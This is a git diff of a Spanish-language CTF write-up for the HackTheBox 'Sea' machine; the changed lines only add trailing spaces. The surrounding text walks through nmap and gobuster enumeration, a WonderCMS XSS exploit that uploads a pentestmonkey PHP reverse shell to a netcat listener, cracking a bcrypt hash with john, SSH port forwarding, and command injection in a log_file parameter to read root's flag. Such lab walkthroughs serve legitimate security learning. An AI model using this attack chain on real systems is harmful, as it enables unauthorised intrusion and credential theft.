@@ -43,8 +43,8 @@ Cada parámetro tiene la siguiente utilidad:
 `10.10.11.28`: IP de la maquina victima.
 `-oG`: exporta el resultado del escaneo en formato 'grepeable' al archivo allPorts.
 
-Su ejecución reporta los siguientes puertos abiertos:
-![allports](/assets/img/sea/allports.png)
+Su ejecución reporta los siguientes puertos abiertos:  
+![allports](/assets/img/sea/allports.png)  
 para extraer los puertos activos podemos usar el siguiente comando:
 ```bash
 grep -oP '\d{1,5}/open' allPorts | awk '{print $1}' FS="/" | xargs | tr ' ' ',' | xclip -sel clip
@@ -55,14 +55,14 @@ Ahora vamos a hacer un escaneo exhaustivo sobre los puertos extraídos  previame
 ```bash
 nmap -p22,80 -sCV 10.10.11.28 -oN targeted
 ```
-Usamos el parámetro `-sCV` para enviar ciertos scripts de reconocimiento a esos puertos y extraer la versión y el servicio que corre sobre cada puerto. Obteniendo así la siguiente información:
-![targeted](/assets/img/sea/targeted.png)
+Usamos el parámetro `-sCV` para enviar ciertos scripts de reconocimiento a esos puertos y extraer la versión y el servicio que corre sobre cada puerto. Obteniendo así la siguiente información:  
+![targeted](/assets/img/sea/targeted.png)  
 Tenemos el el servicio de SSH corriendo sobre el puerto 22 y un pagina web HTTP corriendo en el puerto 80, de momento sin información relevante y vulnerabilidades en sus respectivas versiones.
 
 ---
 ## **Enumeración Web**
 
-Accedemos a la pagina web digitando la dirección IP de la maquina victima en el buscador de nuestra preferencia.
+Accedemos a la pagina web digitando la dirección IP de la maquina victima en el buscador de nuestra preferencia.  
 ![Page](/assets/img/sea/PageIP.png)
 
 Observamos un pagina bastante básica con solo dos enlaces a la vista **HOME** y **HOW TO PARTICIPATE**. En la descripción de la segunda observamos un enlace hacia un archivo `contact.php` al cual no tenemos acceso pues nos indica que la pagina no resuelve al dominio `sea.htb` por lo que agregamos el dominio al archivo `/etc/hosts`
@@ -87,13 +87,13 @@ gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-li
 | `-x`          | Busca archivos con las extensiones señaladas.                                    |
 | `-t`          | Uso de hilos agilizar la búsqueda. Hacer uso de muchos puede bajar la precisión. |
 | `2>/dev/null` | Para que no impriman los errores en pantalla.                                    |
-Mediante el escaneo encontramos los siguientes directorios y archivos: 
-![Page](/assets/img/sea/GoBuster1.png)
-Nuestro directorio de interés es **themes** al cual no tenemos acceso dado el código que devuelve, pero del cual podemos seguir listando subdirectorios y archivos.
-![Page](/assets/img/sea/GoBuster2Theme.png)
+Mediante el escaneo encontramos los siguientes directorios y archivos:  
+![Page](/assets/img/sea/GoBuster1.png)  
+Nuestro directorio de interés es **themes** al cual no tenemos acceso dado el código que devuelve, pero del cual podemos seguir listando subdirectorios y archivos.  
+![Page](/assets/img/sea/GoBuster2Theme.png)  
 Observamos que tenemos un tema **bike** un archivo **version** el cual podemos observar ingresando a la ruta `http://sea.htb/themes/bike/version`. Vemos la versión `3.2.0`, ahora resta averiguar el gestor de contenidos de la pagina a la que pertenece ese tema y versión.
-Mediante una búsqueda del tema en Google nos topamos con que este tema pertenece a **WonderCMS**.
-![Page](/assets/img/sea/WonderCMS.png)
+Mediante una búsqueda del tema en Google nos topamos con que este tema pertenece a **WonderCMS**.  
+![Page](/assets/img/sea/WonderCMS.png)  
 >`Wonder CMS` es un gestor de contenidos (CMS) de código abierto y gratuito que permite crear y editar sitios web, blogs o páginas de aterrizaje: 
 - Es un CMS de archivos planos que es rápido, responsivo y no requiere configuración 
 - Es un CMS pequeño y sencillo que se instala fácilmente 
@@ -183,8 +183,8 @@ xhr3.onload = function() {
 ```
 ##### Modificación del rev.php
 
-Para este paso descargaremos una ReverShell de la siguiente fuente: [pentestmonkey.net](https://pentestmonkey.net/tools/web-shells/php-reverse-shell). Aquí descargaremos un comprimido `php-reverse-shell-1.0.tar.gz` que debemos descomprimir y eliminar los archivos innecesarios. Por ultimo renombrar el archivo `php-reverse-shell.php` como `rev.php` y comprimirlo en un archivo zip llamado `revshell-main.zip`. El cambio de estructura se vería algo así:
-![rev](/assets/img/sea/rev.png)
+Para este paso descargaremos una ReverShell de la siguiente fuente: [pentestmonkey.net](https://pentestmonkey.net/tools/web-shells/php-reverse-shell). Aquí descargaremos un comprimido `php-reverse-shell-1.0.tar.gz` que debemos descomprimir y eliminar los archivos innecesarios. Por ultimo renombrar el archivo `php-reverse-shell.php` como `rev.php` y comprimirlo en un archivo zip llamado `revshell-main.zip`. El cambio de estructura se vería algo así:  
+![rev](/assets/img/sea/rev.png)  
 >Dentro del archivo rev.php no hacemos ninguna modificación, sin embargo debemos tomar el puerto, en este caso, el 1234.
 
 ### Fase 2: Ejecución
@@ -204,21 +204,21 @@ python3 exploit.py "http://sea.htb/wondercms?page=index.php" 10.10.16.76 1234
 1. Abrirá un servidor local en el puerto 8000 -> 127.0.0.1:8000
 2. Creara un archivo xss.js que será el archivo que ejecute el Cross Site Scripting.
 3. Nos pedirá que nos pongamos en escucha por el puerto `1234` vía **netcat**.
-![Page](/assets/img/sea/NC.png)
+![Page](/assets/img/sea/NC.png)  
 5. Generara un link que debemos copiar en la pagina `http://sea.htb/contact.php` en el campo ****website***.
-![Page](/assets/img/sea/XSS.png)
+![Page](/assets/img/sea/XSS.png)  
 6. Esperaremos con el puerto aun en escucha, mientras la pagina hace las solicitudes del archivo zip y ejecuta el rev.php.
 7. Es importante no detener la ejecución del script hasta que tengamos acceso a la shell.
 
 El script ejecutado al 100% se vera de la siguiente manera:
-![Page](/assets/img/sea/exploit.png)
+![Page](/assets/img/sea/exploit.png)  
 
 ---
 ## User Flag
 
 Con el proceso de explotación anterior obtuvimos una ReverShell como el usuario **www-data**. Este usuario y grupo de sistema es creado comúnmente en sistemas basados en Linux para ejecutar servicios web como **Apache** y **Nginx**. Su ruta dentro del sistema es comunmente la `/var/www/`.
-Aquí podemos explorar los archivos propios de la pagina como los directorios que antes no teníamos permisos de **Directory Listig** como por ejemplo el directorio themes y data. En este ultimo es donde encontramos la siguiente base de datos:
-![Page](/assets/img/sea/database.png)
+Aquí podemos explorar los archivos propios de la pagina como los directorios que antes no teníamos permisos de **Directory Listig** como por ejemplo el directorio themes y data. En este ultimo es donde encontramos la siguiente base de datos:  
+![Page](/assets/img/sea/database.png)  
 y si por fin tenemos una contraseña de acceso aunque encriptada, asi que ahora vamos a buscar los usuarios existentes para saber a quien pertenece esta contraseña con el comando:
 ```bash
 cat /etc/passwd | grep bash
@@ -241,7 +241,7 @@ john --format=bcrypt --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
 | `--format=`  | tipo de desencriptado.                            |
 | `--wordlist` | Diccionario de contraseñas, en este caso rockyou. |
 | `hash.txt`   | Archivo que contiene el hash                      |
-![Page](/assets/img/sea/hash.png)
+![Page](/assets/img/sea/hash.png)  
 ### Acceso SSH
 
 Let's go, tenemos la contraseña del usuario 'amay', dado que el puerto 22 esta abierto tenemos el servicio de SSH disponible por lo que establecemos la conexión de la siguiente manera:
@@ -270,8 +270,8 @@ netstat -tuln
 | `-u`      | Muestra las conexiones de tipo **UDP**.                                                                                  |
 | `-l`      | Filtra por los puertos en modo escucha.                                                                                  |
 | `-n`      | Muestra los resultados en formato numérico envés de resolver a los **DNS**.                                              |
-Es los resultados del comando podemos observar los siguientes resultados:
-![Page](/assets/img/sea/netstat.png)
+Es los resultados del comando podemos observar los siguientes resultados:  
+![Page](/assets/img/sea/netstat.png)  
 De estos llama la atención el `127.0.0.1:8080` por lo que aplicaremos **Port-Forwarding** para acceder al puerto interno, de manera local desde nuestra maquina.
 
 ### Port Forwarding
@@ -285,20 +285,20 @@ ssh -L 8081:localhost:8080 amay@10.10.11.28
 `-L` Señala a nuestro puerto 8081 como el puerto 8080 maquina victima de esta forma podremos acceder al de manera local al servicio interno que la misma.
 
 Una vez accedemos a la dirección `127.0.0.1:8081` nos pedirá unas **credenciales**, que son las misma que usamos para acceder como el usuario amay; y observaremos la siguiente interfaz:
-![Page](/assets/img/sea/logsystem.png)
+![Page](/assets/img/sea/logsystem.png)  
 En esta interfaz podremos listar el contenido de ciertos **logs**, archivos que registran cada petición hecha al servidor. Por lo que para ver como funciona lo interceptaremos la petición que realiza el botón `Analyze` con la aplicación **`BURPSUIT`**. Debemos recordar
-De no conocer como configurar **BurpSuit** visitar el siguiente enlace a la pagina oficial: [PortSwigger](https://portswigger.net/burp/documentation/desktop/getting-started)
+De no conocer como configurar **BurpSuit** visitar el siguiente enlace a la pagina oficial: [PortSwigger](https://portswigger.net/burp/documentation/desktop/getting-started)  
 ### Local File Inclusion
 
-Una vez interceptado observamos la siguiente petición vía **POST**
-![Page](/assets/img/sea/burpintercept.png)
+Una vez interceptado observamos la siguiente petición vía **POST**  
+![Page](/assets/img/sea/burpintercept.png)  
 Vemos que mediante el parámetro **log_file** la pagina hace una petición que imprime el contenido de la ruta: `var/log/apache2/access.log`
 Ruta que no es accesible por un usuario sin privilegios, por lo que concluimos que la pagina ejecuta dicha instrucción como **root**.
 
-Con esta información probamos listar el contenido de diferentes archivos concatenado la impresión del **log** con otras instrucciones desde el modo **Repeater** de BurpSuit. Consiguiendo finalmente la Flag de root al imprimir la ruta `/root/root.txt`.
-![Page](/assets/img/sea/rootflag.png)
-Por ultimo nos daremos cuenta que podemos ejecutar ciertos comandos como root, pero en mi caso no encontré la forma de establecer una ReverShell privilegiada.
-![Page](/assets/img/sea/comandexe.png)
+Con esta información probamos listar el contenido de diferentes archivos concatenado la impresión del **log** con otras instrucciones desde el modo **Repeater** de BurpSuit. Consiguiendo finalmente la Flag de root al imprimir la ruta `/root/root.txt`.  
+![Page](/assets/img/sea/rootflag.png)  
+Por ultimo nos daremos cuenta que podemos ejecutar ciertos comandos como root, pero en mi caso no encontré la forma de establecer una ReverShell privilegiada.  
+![Page](/assets/img/sea/comandexe.png)  
 ---
 
 > **GG!** Espero hayan disfrutado siguiendo de este WriteUp y que hayan aprendido los conceptos aplicados. Buena suerte :)
